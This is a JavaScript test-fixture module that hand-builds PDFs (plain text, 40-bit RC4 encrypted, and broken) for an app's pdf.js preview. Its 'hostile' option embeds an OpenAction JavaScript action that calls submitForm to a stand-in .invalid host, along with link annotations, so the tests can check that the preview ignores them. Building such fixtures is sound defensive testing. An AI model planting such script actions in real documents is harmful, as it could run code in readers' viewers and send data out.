// PDF fixtures for the PDF view (#346), written byte by byte: no generator
// library, so that the file says exactly what the test needs — and nothing a
// library would add on its own.
//
//   makeTextPdf({ pages, title, hostile })  pages of text in Helvetica, which
//                                          is not embedded: pdf.js has to ask
//                                          for its standard font data
//   makeEncryptedPdf({ password })         RC4 40-bit (standard security
//                                          handler, revision 2) with a user
//                                          password, so pdf.js asks for it
//   BROKEN_PDF                             the header and nothing usable
//
// `hostile: true` adds what must do nothing in the preview: an OpenAction
// running JavaScript that would submit to a server, and link annotations to a
// web address and to a JavaScript action.

import { createHash } from 'node:crypto';

export const HOSTILE_HOST = 'snotra-smoke.invalid';

const A4 = [595, 842];

function escapePdfString(text) {
  return text.replace(/[\\()]/g, (c) => `\\${c}`);
}

/** Assembles objects 1..n, the cross-reference table and the trailer. */
function assemble(objects, trailerExtra = '') {
  const header = Buffer.from('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', 'latin1');
  const parts = [header];
  const offsets = [];
  let offset = header.length;
  objects.forEach((body, index) => {
    const chunk = Buffer.concat([
      Buffer.from(`${index + 1} 0 obj\n`, 'latin1'),
      Buffer.isBuffer(body) ? body : Buffer.from(body, 'latin1'),
      Buffer.from('\nendobj\n', 'latin1'),
    ]);
    offsets.push(offset);
    offset += chunk.length;
    parts.push(chunk);
  });
  const xref = [
    'xref',
    `0 ${objects.length + 1}`,
    '0000000000 65535 f ',
    ...offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n `),
    'trailer',
    `<< /Size ${objects.length + 1} /Root 1 0 R ${trailerExtra}>>`,
    'startxref',
    String(offset),
    '%%EOF',
    '',
  ].join('\n');
  parts.push(Buffer.from(xref, 'latin1'));
  return Buffer.concat(parts);
}

function stream(content, encrypt) {
  const data = encrypt ? encrypt(Buffer.from(content, 'latin1')) : Buffer.from(content, 'latin1');
  return Buffer.concat([
    Buffer.from(`<< /Length ${data.length} >>\nstream\n`, 'latin1'),
    data,
    Buffer.from('\nendstream', 'latin1'),
  ]);
}

function pageContent(number, total, title) {
  const lines = [
    'This page is drawn by pdf.js inside Snotra.',
    'Helvetica is not embedded here, so the standard font',
    'data comes from the main process, not from the network.',
  ];
  return [
    '0 0.459 0.620 rg 56 770 483 6 re f',
    '0.12 0.12 0.11 rg',
    `BT /F2 26 Tf 56 724 Td (${escapePdfString(title)}) Tj ET`,
    `BT /F1 12 Tf 56 700 Td (Page ${number} of ${total}) Tj ET`,
    ...lines.map((line, i) => `BT /F1 14 Tf 56 ${650 - i * 22} Td (${escapePdfString(line)}) Tj ET`),
    '0.95 0.93 0.90 rg 56 380 483 180 re f',
    '0 0.459 0.620 RG 2 w 56 380 483 180 re S',
    '0 0.459 0.620 rg',
    `BT /F2 72 Tf 250 440 Td (${number}) Tj ET`,
    '0.37 0.36 0.35 rg',
    'BT /F1 11 Tf 56 60 Td (Snotra Agent - PDF preview fixture) Tj ET',
  ].join('\n');
}

export function makeTextPdf({ pages = 1, title = 'Specification', hostile = false } = {}) {
  // 1 catalog, 2 pages, 3 regular font, 4 bold font, 5 JavaScript action,
  // then two objects (page, content) per page.
  const first = 6;
  const kids = Array.from({ length: pages }, (_, i) => `${first + i * 2} 0 R`).join(' ');
  const objects = [
    `<< /Type /Catalog /Pages 2 0 R${hostile ? ' /OpenAction 5 0 R' : ''} >>`,
    `<< /Type /Pages /Kids [${kids}] /Count ${pages} >>`,
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>',
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>',
    `<< /S /JavaScript /JS (globalThis.__pwnedPdf = true; this.submitForm\\("https://${HOSTILE_HOST}/js"\\);) >>`,
  ];
  for (let i = 0; i < pages; i += 1) {
    const annots = hostile
      ? ` /Annots [<< /Type /Annot /Subtype /Link /Rect [56 640 400 670] /Border [0 0 0] /A << /S /URI /URI (https://${HOSTILE_HOST}/link) >> >> << /Type /Annot /Subtype /Link /Rect [56 380 539 560] /Border [0 0 0] /A 5 0 R >>]`
      : '';
    objects.push(
      `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 ${A4[0]} ${A4[1]}] /Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> /Contents ${first + i * 2 + 1} 0 R${annots} >>`,
      stream(pageContent(i + 1, pages, title)),
    );
  }
  return assemble(objects);
}

// ── Encryption: standard security handler, revision 2, 40-bit RC4 ─────────

const PADDING = Buffer.from(
  '28bf4e5e4e758a4164004e56fffa01082e2e00b6d0683e802f0ca9fe6453697a',
  'hex',
);

function rc4(key, data) {
  const s = Array.from({ length: 256 }, (_, i) => i);
  let j = 0;
  for (let i = 0; i < 256; i += 1) {
    j = (j + s[i] + key[i % key.length]) & 0xff;
    [s[i], s[j]] = [s[j], s[i]];
  }
  const out = Buffer.alloc(data.length);
  let i = 0;
  j = 0;
  for (let k = 0; k < data.length; k += 1) {
    i = (i + 1) & 0xff;
    j = (j + s[i]) & 0xff;
    [s[i], s[j]] = [s[j], s[i]];
    out[k] = data[k] ^ s[(s[i] + s[j]) & 0xff];
  }
  return out;
}

const md5 = (...parts) => createHash('md5').update(Buffer.concat(parts)).digest();
const pad = (password) => Buffer.concat([Buffer.from(password, 'latin1'), PADDING]).subarray(0, 32);

export function makeEncryptedPdf({ password = 'secret', owner = 'owner' } = {}) {
  const id = Buffer.from('536e6f7472612050444620666978747572', 'hex').subarray(0, 16);
  const permissions = -44; // print, no modify
  const pBytes = Buffer.alloc(4);
  pBytes.writeInt32LE(permissions);
  const O = rc4(md5(pad(owner)).subarray(0, 5), pad(password));
  const key = md5(pad(password), O, pBytes, id).subarray(0, 5);
  const U = rc4(key, PADDING);
  const objectKey = (num) => md5(key, Buffer.from([num & 0xff, (num >> 8) & 0xff, (num >> 16) & 0xff, 0, 0])).subarray(0, 10);

  // 1 catalog, 2 pages, 3 page, 4 content, 5 font, 6 encryption dictionary.
  const objects = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 5 0 R /F2 5 0 R >> >> /Contents 4 0 R >>',
    stream(pageContent(1, 1, 'Locked'), (data) => rc4(objectKey(4), data)),
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>',
    `<< /Filter /Standard /V 1 /R 2 /O <${O.toString('hex')}> /U <${U.toString('hex')}> /P ${permissions} >>`,
  ];
  return assemble(objects, `/Encrypt 6 0 R /ID [<${id.toString('hex')}> <${id.toString('hex')}>] `);
}

/** Starts like a PDF, then nothing a reader could use. */
export const BROKEN_PDF = Buffer.from('%PDF-1.7\n%\xe2\xe3\xcf\xd3\nthis is where the objects would be\n', 'latin1');
